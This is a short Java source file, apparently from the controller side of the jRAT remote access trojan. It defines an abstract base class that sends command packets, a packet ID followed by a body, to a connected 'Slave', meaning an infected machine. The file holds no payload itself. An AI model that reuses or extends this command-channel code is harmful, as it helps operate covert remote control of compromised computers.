package jrat.controller.packets.outgoing;

import jrat.controller.Slave;

import java.io.DataOutputStream;


public abstract class AbstractOutgoingPacket {

	public abstract void write(Slave slave) throws Exception;

	public abstract short getPacketId();

	public synchronized final void send(Slave slave, DataOutputStream dos) {
		try {
			short id = getPacketId();

			slave.writeShort(getPacketId());
			this.write(slave);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
